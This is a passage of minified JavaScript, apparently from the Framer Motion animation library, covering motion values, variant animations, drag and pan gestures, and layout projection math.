Rk{constructor(r,o={}){this.version="10.18.0",this.timeDelta=0,this.lastUpdated=0,this.canTrackVelocity=!1,this.events={},this.updateAndNotify=(a,c=!0)=>{this.prev=this.current,this.current=a;const{delta:p,timestamp:d}=et;this.lastUpdated!==d&&(this.timeDelta=p,this.lastUpdated=d,De.postRender(this.scheduleVelocityCheck)),this.prev!==this.current&&this.events.change&&this.events.change.notify(this.current),this.events.velocityChange&&this.events.velocityChange.notify(this.getVelocity()),c&&this.events.renderRequest&&this.events.renderRequest.notify(this.current)},this.scheduleVelocityCheck=()=>De.postRender(this.velocityCheck),this.velocityCheck=({timestamp:a})=>{a!==this.lastUpdated&&(this.prev=this.current,this.events.velocityChange&&this.events.velocityChange.notify(this.getVelocity()))},this.hasAnimated=!1,this.prev=this.current=r,this.canTrackVelocity=Mk(this.current),this.owner=o.owner}onChange(r){return this.on("change",r)}on(r,o){this.events[r]||(this.events[r]=new Lc);const a=this.events[r].add(o);return r==="change"?()=>{a(),De.read(()=>{this.events.change.getSize()||this.stop()})}:a}clearListeners(){for(const r in this.events)this.events[r].clear()}attach(r,o){this.passiveEffect=r,this.stopPassiveEffect=o}set(r,o=!0){!o||!this.passiveEffect?this.updateAndNotify(r,o):this.passiveEffect(r,this.updateAndNotify)}setWithVelocity(r,o,a){this.set(o),this.prev=r,this.timeDelta=a}jump(r){this.updateAndNotify(r),this.prev=r,this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}get(){return this.current}getPrevious(){return this.prev}getVelocity(){return this.canTrackVelocity?zg(parseFloat(this.current)-parseFloat(this.prev),this.timeDelta):0}start(r){return this.stop(),new Promise(o=>{this.hasAnimated=!0,this.animation=r(o),this.events.animationStart&&this.events.animationStart.notify()}).then(()=>{this.events.animationComplete&&this.events.animationComplete.notify(),this.clearAnimation()})}stop(){this.animation&&(this.animation.stop(),this.events.animationCancel&&this.events.animationCancel.notify()),this.clearAnimation()}isAnimating(){return!!this.animation}clearAnimation(){delete this.animation}destroy(){this.clearListeners(),this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}}function Dr(n,r){return new Rk(n,r)}const $g=n=>r=>r.test(n),Nk={test:n=>n==="auto",parse:n=>n},Kg=[er,oe,_t,Sn,Ow,Vw,Nk],wi=n=>Kg.find($g(n)),Lk=[...Kg,it,En],jk=n=>Lk.find($g(n));function Bk(n,r,o){n.hasValue(r)?n.getValue(r).set(o):n.addValue(r,Dr(o))}function Fk(n,r){const o=Ss(n,r);let{transitionEnd:a={},transition:c={},...p}=o?n.makeTargetAnimatable(o,!1):{};p={...p,...a};for(const d in p){const h=e0(p[d]);Bk(n,d,h)}}function Vk(n,r,o){var a,c;const p=Object.keys(r).filter(h=>!n.hasValue(h)),d=p.length;if(d)for(let h=0;h<d;h++){const g=p[h],f=r[g];let y=null;Array.isArray(f)&&(y=f[0]),y===null&&(y=(c=(a=o[g])!==null&&a!==void 0?a:n.readValue(g))!==null&&c!==void 0?c:r[g]),y!=null&&(typeof y=="string"&&(Gg(y)||Hg(y))?y=parseFloat(y):!jk(y)&&En.test(f)&&(y=Ug(g,f)),n.addValue(g,Dr(y,{owner:n})),o[g]===void 0&&(o[g]=y),y!==null&&n.setBaseTarget(g,y))}}function Ok(n,r){return r?(r[n]||r.default||r).from:void 0}function zk(n,r,o){const a={};for(const c in n){const p=Ok(c,r);if(p!==void 0)a[c]=p;else{const d=o.getValue(c);d&&(a[c]=d.get())}}return a}function _k({protectedKeys:n,needsAnimating:r},o){const a=n.hasOwnProperty(o)&&r[o]!==!0;return r[o]=!1,a}function Wk(n,r){const o=n.get();if(Array.isArray(r)){for(let a=0;a<r.length;a++)if(r[a]!==o)return!0}else return o!==r}function qg(n,r,{delay:o=0,transitionOverride:a,type:c}={}){let{transition:p=n.getDefaultTransition(),transitionEnd:d,...h}=n.makeTargetAnimatable(r);const g=n.getValue("willChange");a&&(p=a);const f=[],y=c&&n.animationState&&n.animationState.getState()[c];for(const v in h){const w=n.getValue(v),T=h[v];if(!w||T===void 0||y&&_k(y,v))continue;const M={delay:o,elapsed:0,...Dc(p||{},v)};if(window.HandoffAppearAnimations){const O=n.getProps()[Yf];if(O){const L=window.HandoffAppearAnimations(O,v,w,De);L!==null&&(M.elapsed=L,M.isHandoff=!0)}}let A=!M.isHandoff&&!Wk(w,T);if(M.type==="spring"&&(w.getVelocity()||M.velocity)&&(A=!1),w.animation&&(A=!1),A)continue;w.start(Mc(v,w,T,n.shouldReduceMotion&&Jn.has(v)?{type:!1}:M));const P=w.animation;hs(g)&&(g.add(v),P.then(()=>g.remove(v))),f.push(P)}return d&&Promise.all(f).then(()=>{d&&Fk(n,d)}),f}function Zl(n,r,o={}){const a=Ss(n,r,o.custom);let{transition:c=n.getDefaultTransition()||{}}=a||{};o.transitionOverride&&(c=o.transitionOverride);const p=a?()=>Promise.all(qg(n,a,o)):()=>Promise.resolve(),d=n.variantChildren&&n.variantChildren.size?(g=0)=>{const{delayChildren:f=0,staggerChildren:y,staggerDirection:v}=c;return Uk(n,r,f+g,y,v,o)}:()=>Promise.resolve(),{when:h}=c;if(h){const[g,f]=h==="beforeChildren"?[p,d]:[d,p];return g().then(()=>f())}else return Promise.all([p(),d(o.delay)])}function Uk(n,r,o=0,a=0,c=1,p){const d=[],h=(n.variantChildren.size-1)*a,g=c===1?(f=0)=>f*a:(f=0)=>h-f*a;return Array.from(n.variantChildren).sort(Hk).forEach((f,y)=>{f.notify("AnimationStart",r),d.push(Zl(f,r,{...p,delay:o+g(y)}).then(()=>f.notify("AnimationComplete",r)))}),Promise.all(d)}function Hk(n,r){return n.sortNodePosition(r)}function Gk(n,r,o={}){n.notify("AnimationStart",r);let a;if(Array.isArray(r)){const c=r.map(p=>Zl(n,p,o));a=Promise.all(c)}else if(typeof r=="string")a=Zl(n,r,o);else{const c=typeof r=="function"?Ss(n,r,o.custom):r;a=Promise.all(qg(n,c,o))}return a.then(()=>n.notify("AnimationComplete",r))}const $k=[...mc].reverse(),Kk=mc.length;function qk(n){return r=>Promise.all(r.map(({animation:o,options:a})=>Gk(n,o,a)))}function Yk(n){let r=qk(n);const o=Xk();let a=!0;const c=(g,f)=>{const y=Ss(n,f);if(y){const{transition:v,transitionEnd:w,...T}=y;g={...g,...T,...w}}return g};function p(g){r=g(n)}function d(g,f){const y=n.getProps(),v=n.getVariantContext(!0)||{},w=[],T=new Set;let M={},A=1/0;for(let O=0;O<Kk;O++){const L=$k[O],N=o[L],B=y[L]!==void 0?y[L]:v[L],$=Ii(B),J=L===f?N.isActive:null;J===!1&&(A=O);let H=B===v[L]&&B!==y[L]&&$;if(H&&a&&n.manuallyAnimateOnMount&&(H=!1),N.protectedKeys={...M},!N.isActive&&J===null||!B&&!N.prevProp||bs(B)||typeof B=="boolean")continue;let le=Qk(N.prevProp,B)||L===f&&N.isActive&&!H&&$||O>A&&$,ve=!1;const Ae=Array.isArray(B)?B:[B];let ne=Ae.reduce(c,{});J===!1&&(ne={});const{prevResolvedValues:be={}}=N,K={...be,...ne},ge=ae=>{le=!0,T.has(ae)&&(ve=!0,T.delete(ae)),N.needsAnimating[ae]=!0};for(const ae in K){const ue=ne[ae],W=be[ae];if(M.hasOwnProperty(ae))continue;let q=!1;cs(ue)&&cs(W)?q=!yg(ue,W):q=ue!==W,q?ue!==void 0?ge(ae):T.add(ae):ue!==void 0&&T.has(ae)?ge(ae):N.protectedKeys[ae]=!0}N.prevProp=B,N.prevResolvedValues=ne,N.isActive&&(M={...M,...ne}),a&&n.blockInitialAnimation&&(le=!1),le&&(!H||ve)&&w.push(...Ae.map(ae=>({animation:ae,options:{type:L,...g}})))}if(T.size){const O={};T.forEach(L=>{const N=n.getBaseTarget(L);N!==void 0&&(O[L]=N)}),w.push({animation:O})}let P=!!w.length;return a&&(y.initial===!1||y.initial===y.animate)&&!n.manuallyAnimateOnMount&&(P=!1),a=!1,P?r(w):Promise.resolve()}function h(g,f,y){var v;if(o[g].isActive===f)return Promise.resolve();(v=n.variantChildren)===null||v===void 0||v.forEach(T=>{var M;return(M=T.animationState)===null||M===void 0?void 0:M.setActive(g,f)}),o[g].isActive=f;const w=d(y,g);for(const T in o)o[T].protectedKeys={};return w}return{animateChanges:d,setActive:h,setAnimateFunction:p,getState:()=>o}}function Qk(n,r){return typeof r=="string"?r!==n:Array.isArray(r)?!yg(r,n):!1}function Un(n=!1){return{isActive:n,protectedKeys:{},needsAnimating:{},prevResolvedValues:{}}}function Xk(){return{animate:Un(!0),whileInView:Un(),whileHover:Un(),whileTap:Un(),whileDrag:Un(),whileFocus:Un(),exit:Un()}}class Zk extends In{constructor(r){super(r),r.animationState||(r.animationState=Yk(r))}updateAnimationControlsSubscription(){const{animate:r}=this.node.getProps();this.unmount(),bs(r)&&(this.unmount=r.subscribe(this.node))}mount(){this.updateAnimationControlsSubscription()}update(){const{animate:r}=this.node.getProps(),{animate:o}=this.node.prevProps||{};r!==o&&this.updateAnimationControlsSubscription()}unmount(){}}let Jk=0;class ex extends In{constructor(){super(...arguments),this.id=Jk++}update(){if(!this.node.presenceContext)return;const{isPresent:r,onExitComplete:o,custom:a}=this.node.presenceContext,{isPresent:c}=this.node.prevPresenceContext||{};if(!this.node.animationState||r===c)return;const p=this.node.animationState.setActive("exit",!r,{custom:a??this.node.getProps().custom});o&&!r&&p.then(()=>o(this.id))}mount(){const{register:r}=this.node.presenceContext||{};r&&(this.unmount=r(this.id))}unmount(){}}const tx={animation:{Feature:Zk},exit:{Feature:ex}},dh=(n,r)=>Math.abs(n-r);function nx(n,r){const o=dh(n.x,r.x),a=dh(n.y,r.y);return Math.sqrt(o**2+a**2)}class Yg{constructor(r,o,{transformPagePoint:a,contextWindow:c,dragSnapToOrigin:p=!1}={}){if(this.startEvent=null,this.lastMoveEvent=null,this.lastMoveEventInfo=null,this.handlers={},this.contextWindow=window,this.updatePoint=()=>{if(!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const v=jl(this.lastMoveEventInfo,this.history),w=this.startEvent!==null,T=nx(v.offset,{x:0,y:0})>=3;if(!w&&!T)return;const{point:M}=v,{timestamp:A}=et;this.history.push({...M,timestamp:A});const{onStart:P,onMove:O}=this.handlers;w||(P&&P(this.lastMoveEvent,v),this.startEvent=this.lastMoveEvent),O&&O(this.lastMoveEvent,v)},this.handlePointerMove=(v,w)=>{this.lastMoveEvent=v,this.lastMoveEventInfo=Ll(w,this.transformPagePoint),De.update(this.updatePoint,!0)},this.handlePointerUp=(v,w)=>{this.end();const{onEnd:T,onSessionEnd:M,resumeAnimation:A}=this.handlers;if(this.dragSnapToOrigin&&A&&A(),!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const P=jl(v.type==="pointercancel"?this.lastMoveEventInfo:Ll(w,this.transformPagePoint),this.history);this.startEvent&&T&&T(v,P),M&&M(v,P)},!pg(r))return;this.dragSnapToOrigin=p,this.handlers=o,this.transformPagePoint=a,this.contextWindow=c||window;const d=xs(r),h=Ll(d,this.transformPagePoint),{point:g}=h,{timestamp:f}=et;this.history=[{...g,timestamp:f}];const{onSessionStart:y}=o;y&&y(r,jl(h,this.history)),this.removeListeners=An(Jt(this.contextWindow,"pointermove",this.handlePointerMove),Jt(this.contextWindow,"pointerup",this.handlePointerUp),Jt(this.contextWindow,"pointercancel",this.handlePointerUp))}updateHandlers(r){this.handlers=r}end(){this.removeListeners&&this.removeListeners(),tn(this.updatePoint)}}function Ll(n,r){return r?{point:r(n.point)}:n}function ph(n,r){return{x:n.x-r.x,y:n.y-r.y}}function jl({point:n},r){return{point:n,delta:ph(n,Qg(r)),offset:ph(n,rx(r)),velocity:ix(r,.1)}}function rx(n){return n[0]}function Qg(n){return n[n.length-1]}function ix(n,r){if(n.length<2)return{x:0,y:0};let o=n.length-1,a=null;const c=Qg(n);for(;o>=0&&(a=n[o],!(c.timestamp-a.timestamp>qn(r)));)o--;if(!a)return{x:0,y:0};const p=en(c.timestamp-a.timestamp);if(p===0)return{x:0,y:0};const d={x:(c.x-a.x)/p,y:(c.y-a.y)/p};return d.x===1/0&&(d.x=0),d.y===1/0&&(d.y=0),d}function yt(n){return n.max-n.min}function Jl(n,r=0,o=.01){return Math.abs(n-r)<=o}function hh(n,r,o,a=.5){n.origin=a,n.originPoint=Le(r.min,r.max,n.origin),n.scale=yt(o)/yt(r),(Jl(n.scale,1,1e-4)||isNaN(n.scale))&&(n.scale=1),n.translate=Le(o.min,o.max,n.origin)-n.originPoint,(Jl(n.translate)||isNaN(n.translate))&&(n.translate=0)}function Ai(n,r,o,a){hh(n.x,r.x,o.x,a?a.originX:void 0),hh(n.y,r.y,o.y,a?a.originY:void 0)}function fh(n,r,o){n.min=o.min+r.min,n.max=n.min+yt(r)}function ox(n,r,o){fh(n.x,r.x,o.x),fh(n.y,r.y,o.y)}function gh(n,r,o){n.min=r.min-o.min,n.max=n.min+yt(r)}function Pi(n,r,o){gh(n.x,r.x,o.x),gh(n.y,r.y,o.y)}function sx(n,{min:r,max:o},a){return r!==void 0&&n<r?n=a?Le(r,n,a.min):Math.max(n,r):o!==void 0&&n>o&&(n=a?Le(o,n,a.max):Math.min(n,o)),n}function mh(n,r,o){return{min:r!==void 0?n.min+r:void 0,max:o!==void 0?n.max+o-(n.max-n.min):void 0}}function ax(n,{top:r,left:o,bottom:a,right:c}){return{x:mh(n.x,o,c),y:mh(n.y,r,a)}}function yh(n,r){let o=r.min-n.min,a=r.max-n.max;return r.max-r.min<n.max-n.min&&([o,a]=[a,o]),{min:o,max:a}}function lx(n,r){return{x:yh(n.x,r.x),y:yh(n.y,r.y)}}function cx(n,r){let o=.5;const a=yt(n),c=yt(r);return c>a?o=Mi(r.min,r.max-a,n.min):a>c&&(o=Mi(n.min,n.max-c,r.min)),Pn(0,1,o)}function ux(n,r){const o={};return r.min!==void 0&&(o.min=r.min-n.min),r.max!==void 0&&(o.max=r.max-n.min),o}const ec=.35;function dx(n=ec){return n===!1?n=0:n===!0&&(n=ec),{x:vh(n,"left","right"),y:vh(n,"top","bottom")}}function vh(n,r,o){return{min:bh(n,r),max:bh(n,o)}}function bh(n,r){return typeof n=="number"?n:n[r]||0}const wh=()=>({translate:0,scale:1,origin:0,originPoint:0}),Er=()=>({x:wh(),y:wh()}),kh=()=>({min:0,max:0}),ze=()=>({x:kh(),y:kh()});function Pt(n){return[n("x"),n("y")]}function Xg({top:n,left:r,right:o,bottom:a}){return{x:{min:r,max:o},y:{min:n,max:a}}}function px({x:n,y:r}){return{top:r.min,right:n.max,bottom:r.max,left:n.min}}function hx(n,r){if(!r)return n;const o=r({x:n.left,y:n.top}),a=r({x:n.right,y:n.bottom});return{top:o.y,left:o.x,bottom:a.y,right:a.x}}function Bl(n){return n===void 0||n===1}function tc({scale:n,scaleX:r,scaleY:o}){return!Bl(n)||!Bl(r)||!Bl(o)}function Hn(n){return tc(n)||Zg(n)||n.z||n.rotate||n.rotateX||n.rotateY}function Zg(n){return xh(n.x)||xh(n.y)}function xh(n){return n&&n!=="0%"}function fs(n,r,o){const a=n-o,c=r*a;return o+c}function Sh(n,r,o,a,c){return c!==void 0&&(n=fs(n,c,a)),fs(n,o,a)+r}function nc(n,r=0,o=1,a,c){n.min=Sh(n.min,r,o,a,c),n.max=Sh(n.max,r,o,a,c)}function Jg(n,{x:r,y:o}){nc(n.x,r.translate,r.scale,r.originPoint),nc(n.y,o.translate,o.scale,o.originPoint)}function fx(n,r,o,a=!1){const c=o.length;if(!c)return;r.x=r.y=1;let p,d;for(let h=0;h<c;h++){p=o[h],d=p.projectionDelta;const g=p.instance;g&&g.style&&g.style.display==="contents"||(a&&p.options.layoutScroll&&p.scroll&&p!==p.root&&Ir(n,{x:-p.scroll.offset.x,y:-p.scroll.offset.y}),d&&(r.x*=d.x.scale,r.y*=d.y.scale,Jg(n,d)),a&&Hn(p.latestValues)&&Ir(n,p.latestValues))}r.x=Th(r.x),r.y=Th(r.y)}function Th(n){return Number.isInteger(n)||n>1.0000000000001||n<.999999999999?n:1}function Tn(n,r){n.min=n.min+r,n.max=n.max+r}function Ch(n,r,[o,a,c]){const p=r[c]!==void 0?r[c]:.5,d=Le(n.min,n.max,p);nc(n,r[o],r[a],d,r.scale)}const gx=["x","scaleX","originX"],mx=["y","scaleY","originY"];function Ir(n,r){Ch(n.x,r,gx),Ch(n.y,r,mx)}function em(n,r){return Xg(hx(n.getBoundingClientRect(),r))}function yx(n,r,o){const a=em(n,o),{scroll:c}=r;return c&&(Tn(a.x,c.offset.x),Tn(a.y,c.offset.y)),a}const tm=({current:n})=>n?n.ownerDocument.defaultView:null,vx=new WeakMap;class bx{constructor(r){this.openGlobalLock=null,this.isDragging=!1,this.currentDirection=null,this.originPoint={x:0,y:0},this.constraints=!1,this.hasMutatedConstraints=!1,this.elastic=ze(),this.visualElement=r}start(r,{snapToCursor:o=!1}={}){const{presenceContext:a}=this.visualElement;if(a&&a.isPresent===!1)return;const c=y=>{const{dragSnapToOrigin:v}=this.getProps();v?this.pauseAnimation():this.stopAnimation(),o&&this.snapToCursor(xs(y,"page").point)},p=(y,v)=>{const{drag:w,dragPropagation:T,onDragStart:M}=this.getProps();if(w&&!T&&(this.openGlobalLock&&this.openGlobalLock(),this.openGlobalLock=fg(w),!this.openGlobalLock))return;this.isDragging=!0,this.currentDirection=null,this.resolveConstraints(),this.visualElement.projection&&(this.visualElement.projection.isAnimationBlocked=!0,this.visualElement.projection.target=void 0),Pt(P=>{let O=this.getAxisMotionValue(P).get()||0;if(_t.test(O)){const{projection:L}=this.visualElement;if(L&&L.layout){const N=L.layout.layoutBox[P];N&&(O=yt(N)*(parseFloat(O)/100))}}this.originPoint[P]=O}),M&&De.update(()=>M(y,v),!1,!0);const{animationState:A}=this.visualElement;A&&A.setActive("whileDrag",!0)},d=(y,v)=>{const{dragPropagation:w,dragDirectionLock:T,onDirectionLock:M,onDrag:A}=this.getProps();if(!w&&!this.openGlobalLock)return;const{offset:P}=v;if(T&&this.currentDirection===null){this.currentDirection=wx(P),this.currentDirection!==null&&M&&M(this.currentDirection);return}this.updateAxis("x",v.point,P),this.updateAxis("y",v.point,P),this.visualElement.render(),A&&A(y,v)},h=(y,v)=>this.stop(y,v),g=()=>Pt(y=>{var v;return this.getAnimationState(y)==="paused"&&((v=this.getAxisMotionValue(y).animation)===null||v===void 0?void 0:v.play())}),{dragSnapToOrigin:f}=this.getProps();this.panSession=new Yg(r,{onSessionStart:c,onStart:p,onMove:d,onSessionEnd:h,resumeAnimation:g},{transformPagePoint:this.visualElement.getTransformPagePoint(),dragSnapToOrigin:f,contextWindow:tm(this.visualElement)})}stop(r,o){const a=this.isDragging;if(this.cancel(),!a)return;const{velocity:c}=o;this.startAnimation(c);const{onDragEnd:p}=this.getProps();p&&De.update(()=>p(r,o))}cancel(){this.isDragging=!1;const{projection:r,animationState:o}=this.visualElement;r&&(r.isAnimationBlocked=!1),this.panSession&&this.panSession.end(),this.panSession=void 0;const{dragPropagation:a}=this.getProps();!a&&this.openGlobalLock&&(this.openGlobalLock(),this.openGlobalLock=null),o&&o.setActive("whileDrag",!1)}updateAxis(r,o,a){const{drag:c}=this.getProps();if(!a||!es(r,c,this.currentDirection))return;const p=this.getAxisMotionValue(r);let d=this.originPoint[r]+a[r];this.constraints&&this.constraints[r]&&(d=sx(d,this.constraints[r],this.elastic[r])),p.set(d)}resolveConstraints(){var r;const{dragConstraints:o,dragElastic:a}=this.getProps(),c=this.visualElement.projection&&!this.visualElement.projection.layout?this.visualElement.projection.measure(!1):(r=this.visualElement.projection)===null||r===void 0?void 0:r.layout,p=this.constraints;o&&Ar(o)?this.constraints||(this.constraints=this.resolveRefConstraints()):o&&c?this.constraints=ax(c.layoutBox,o):this.constraints=!1,this.elastic=dx(a),p!==this.constraints&&c&&this.constraints&&!this.hasMutatedConstraints&&Pt(d=>{this.getAxisMotionValue(d)&&(this.constraints[d]=ux(c.layoutBox[d],this.constraints[d]))})}resolveRefConstraints(){const{dragConstraints:r,onMeasureDragConstraints:o}=this.getProps();if(!r||!Ar(r))return!1;const a=r.current,{projection:c}=this.visualElement;if(!c||!c.layout)return!1;const p=yx(a,c.root,this.visualElement.getTransformPagePoint());let d=lx(c.layout.layoutBox,p);if(o){const h=o(px(d));this.hasMutatedConstraints=!!h,h&&(d=Xg(h))}return d}startAnimation(r){const{drag:o,dragMomentum:a,dragElastic:c,dragTransition:p,dragSnapToOrigin:d,onDragTransitionEnd:h}=this.getProps(),g=this.constraints||{},f=Pt(y=>{if(!es(y,o,this.currentDirection))return;let v=g&&g[y]||{};d&&(v={min:0,max:0});const w=c?200:1e6,T=c?40:1e7,M={type:"inertia",velocity:a?r[y]:0,bounceStiffness:w,bounceDamping:T,timeConstant:750,restDelta:1,restSpeed:10,...p,...v};return this.startAxisValueAnimation(y,M)});return Promise.all(f).then(h)}startAxisValueAnimation(r,o){const a=this.getAxisMotionValue(r);return a.start(Mc(r,a,0,o))}stopAnimation(){Pt(r=>this.getAxisMotionValue(r).stop())}pauseAnimation(){Pt(r=>{var o;return(o=this.getAxisMotionValue(r).animation)===null||o===void 0?void 0:o.pause()})}getAnimationState(r){var o;return(o=this.getAxisMotionValue(r).animation)===null||o===void 0?void 0:o.state}getAxisMotionValue(r){const o="_drag"+r.toUpperCase(),a=this.visualElement.getProps(),c=a[o];return c||this.visualElement.getValue(r,(a.initial?a.initial[r]:void 0)||0)}snapToCursor(r){Pt(o=>{const{drag:a}=this.getProps();if(!es(o,a,this.currentDirection))return;const{projection:c}=this.visualElement,p=this.getAxisMotionValue(o);if(c&&c.layout){const{min:d,max:h}=c.layout.layoutBox[o];p.set(r[o]-Le(d,h,.5))}})}scalePositionWithinConstraints(){if(!this.visualElement.current)return;const{drag:r,dragConstraints:o}=this.getProps(),{projection:a}=this.visualElement;if(!Ar(o)||!a||!this.constraints)return;this.stopAnimation();const c={x:0,y:0};Pt(d=>{const h=this.getAxisMotionValue(d);if(h){const g=h.get();c[d]=cx({min:g,max:g},this.constraints[d])}});const{transformTemplate:p}=this.visualElement.getProps();this.visualElement.current.style.transform=p?p({},""):"none",a.root&&a.root.updateScroll(),a.updateLayout(),this.resolveConstraints(),Pt(d=>{if(!es(d,r,null))return;const h=this.getAxisMotionValue(d),{min:g,max:f}=this.constraints[d];h.set(Le(g,f,c[d]))})}addListeners(){if(!this.visualElement.current)return;vx.set(this.visualElement,this);const r=this.visualElement.current,o=Jt(r,"pointerdown",g=>{const{drag:f,dragListener:y=!0}=this.getProps();f&&y&&this.start(g)}),a=()=>{const{dragConstraints:g}=this.getProps();Ar(g)&&(this.constraints=this.resolveRefConstraints())},{projection:c}=this.visualElement,p=c.addEventListener("measure",a);c&&!c.layout&&(c.root&&c.root.updateScroll(),c.updateLayout()),a();const d=Zt(window,"resize",()=>this.scalePositionWithinConstraints()),h=c.addEventListener("didUpdate",({delta:g,hasLayoutChanged:f})=>{this.isDragging&&f&&(Pt(y=>{const v=this.getAxisMotionValue(y);v&&(this.originPoint[y]+=g[y].translate,v.set(v.get()+g[y].translate))}),this.visualElement.render())});return()=>{d(),o(),p(),h&&h()}}getProps(){const r=this.visualElement.getProps(),{drag:o=!1,dragDirectionLock:a=!1,dragPropagation:c=!1,dragConstraints:p=!1,dragElastic:d=ec,dragMomentum:h=!0}=r;return{...r,drag:o,dragDirectionLock:a,dragPropagation:c,dragConstraints:p,dragElastic:d,dragMomentum:h}}}function es(n,r,o){return(r===!0||r===n)&&(o===null||o===n)}function wx(n,r=10){let o=null;return Math.abs(n.y)>r?o="y":Math.abs(n.x)>r&&(o="x"),o}class kx extends In{constructor(r){super(r),this.removeGroupControls=Ve,this.removeListeners=Ve,this.controls=new bx(r)}mount(){const{dragControls:r}=this.node.getProps();r&&(this.removeGroupControls=r.subscribe(this.controls)),this.removeListeners=this.controls.addListeners()||Ve}unmount(){this.removeGroupControls(),this.removeListeners()}}const Ah=n=>(r,o)=>{n&&De.update(()=>n(r,o))};class xx extends In{constructor(){super(...arguments),this.removePointerDownListener=Ve}onPointerDown(r){this.session=new Yg(r,this.createPanHandlers(),{transformPagePoint:this.node.getTransformPagePoint(),contextWindow:tm(this.node)})}createPanHandlers(){const{onPanSessionStart:r,onPanStart:o,onPan:a,onPanEnd:c}=this.node.getProps();return{onSessionStart:Ah(r),onStart:Ah(o),onMove:a,onEnd:(p,d)=>{delete this.session,c&&De.update(()=>c(p,d))}}}mount(){this.removePointerDownListener=Jt(this.node.current,"pointerdown",r=>this.onPointerDown(r))}update(){this.session&&this.session.updateHandlers(this.createPanHandlers())}unmount(){this.removePointerDownListener(),this.session&&this.session.end()}}function Sx(){const n=I.useContext(fc);if(n===null)return[!0,null];const{isPresent:r,onExitComplete:o,register:a}=n,c=I.useId();return I.useEffect(()=>a(c),[]),!r&&o?[!1,()=>o&&o(c)]:[!0]}const is={hasAnimatedSinceResize:!0,hasEverUpdated:!1};function Ph(n,r){return r.max===r.min?0:n/(r.max-r.min)*100}const ki={correct:(n,r)=>{if(!r.target)return n;if(typeof n=="string")if(oe.test(n))n=parseFloat(n);else return n;const o=Ph(n,r.target.x),a=Ph(n,r.target.y);return`${o}% ${a}%`}},Tx={correct:(n,{treeScale:r,projectionDelta:o})=>{const a=n,c=En.parse(n);if(c.length>5)return a;const p=En.createTransformer(n),d=typeof c[0]!="number"?1:0,h=o.x.scale*r.x,g=o.y.scale*r.y;c[0+d]/=h,c[1+d]/=g;const f=Le(h,g,.5);return typeof c[2+d]=="number"&&(c[2+d]/=f),typeof c[3+d]=="number"&&(c[3+d]/=f),p(c)}};class Cx extends Te.Component{componentDidMount(){const{visualElement:r,layoutGroup:o,switchLayoutGroup:a,layoutId:c}=this.props,{projection:p}=r;Mw(Ax),p&&(o.group&&o.group.add(p),a&&a.register&&c&&a.register(p),p.root.didUpdate(),p.addEventListener("animationComplete",()=>{this.safeToRemove()}),p.setOptions({...p.options,onExitComplete:()=>this.safeToRemove()})),is.hasEverUpdated=!0}getSnapshotBeforeUpdate(r){const{layoutDependency:o,visualElement:a,drag:c,isPresent:p}=this.props,d=a.projection;return d&&(d.isPresent=p,c||r.layoutDependency!==o||o===void 0?d.willUpdate():this.safeToRemove(),r.isPresent!==p&&(p?d.promote():d.relegate()||De.postRender(()=>{const h=d.getStack();(!h||!h.members.length)&&this.safeToRemove()}))),null}componentDidUpdate(){const{projection:r}=this.props.visualElement;r&&(r.root.didUpdate(),queueMicrotask(()=>{!r.currentAnimation&&r.isLead()&&this.safeToRemove()}))}componentWillUnmount(){const{visualElement:r,layoutGroup:o,switchLayoutGroup:a}=this.props,{projection:c}=r;c&&(c.scheduleCheckAfterUnmount(),o&&o.group&&o.group.remove(c),a&&a.deregister&&a.deregister(c))}safeToRemove(){const{safeToRemove:r}=this.props;r&&r()}render(){return null}}function nm(n){const[r,o]=Sx(),a=I.useContext(Xf);return Te.createElement(Cx,{...n,layoutGroup:a,switchLayoutGroup:I.useContext(Zf),isPresent:r,safeToRemove:o})}const Ax={borderRadius:{...ki,applyTo:["borderTopLeftRadius","borderTopRightRadius","borderBottomLeftRadius","borderBottomRightRadius"]},borderTopLeftRadius:ki,borderTopRightRadius:ki,borderBottomLeftRadius:ki,borderBottomRightRadius:ki,boxShadow:Tx},rm=["TopLeft","TopRight","BottomLeft","BottomRight"],Px=rm.length,Eh=n=>typeof n=="string"?parseFloat(n):n,Ih=n=>typeof n=="number"||oe.test(n);function Ex(n,r,o,a,c,p){c?(n.opacity=Le(0,o.opacity!==void 0?o.opacity:1,Ix(a)),n.opacityExit=Le(r.opacity!==void 0?r.opacity:1,0,Dx(a))):p&&(n.opacity=Le(r.opacity!==void 0?r.opacity:1,o.opacity!==void 0?o.opacity:1,a));for(let d=0;d<Px;d++){const h=`border${rm[d]}Radius`;let g=Dh(r,h),f=Dh(o,h);if(g===void 0&&f===void 0)continue;g||(g=0),f||(f=0),g===0||f===0||Ih(g)===Ih(f)?(n[h]=Math.max(Le(Eh(g),Eh(f),a),0),(_t.test(f)||_t.test(g))&&(n[h]+="%")):n[h]=f}(r.rotate||o.rotate)&&(n.rotate=Le(r.rotate||0,o.rotate||0,a))}function Dh(n,r){return n[r]!==void 0?n[r]:n.borderRadius}const Ix=im(0,.5,Ag),Dx=im(.5,.95,Ve);function im(n,r,o){return a=>a<n?0:a>r?1:o(Mi(n,r,a))}function Mh(n,r){n.min=r.min,n.max=r.max}function At(n,r){Mh(n.x,r.x),Mh(n.y,r.y)}function Rh(n,r,o,a,c){return n-=r,n=fs(n,1/o,a),c!==void 0&&(n=fs(n,1/c,a)),n}function Mx(n,r=0,o=1,a=.5,c,p=n,d=n){if(_t.test(r)&&(r=parseFloat(r),r=Le(d.min,d.max,r/100)-d.min),typeof r!="number")return;let h=Le(p.min,p.max,a);n===p&&(h-=r),n.min=Rh(n.min,r,o,h,c),n.max=Rh(n.max,r,o,h,c)}function Nh(n,r,[o,a,c],p,d){Mx(n,r[o],r[a],r[c],r.scale,p,d)}const Rx=["x","scaleX","originX"],Nx=["y","scaleY","originY"];function Lh(n,r,o,a){Nh(n.x,r,Rx,o?o.x:void 0,a?a.x:void 0),Nh(n.y,r,Nx,o?o.y:void 0,a?a.y:void 0)}function jh(n){return n.translate===0&&n.scale===1}function om(n){return jh(n.x)&&jh(n.y)}function Lx(n,r){return n.x.min===r.x.min&&n.x.max===r.x.max&&n.y.min===r.y.min&&n.y.max===r.y.max}function sm(n,r){return Math.round(n.x.min)===Math.round(r.x.min)&&Math.round(n.x.max)===Math.round(r.x.max)&&Math.round(n.y.min)===Math.round(r.y.min)&&Math.round(n.y.max)===Math.round(r.y.max)}function Bh(n){return yt(n.x)/yt(n.y)}class 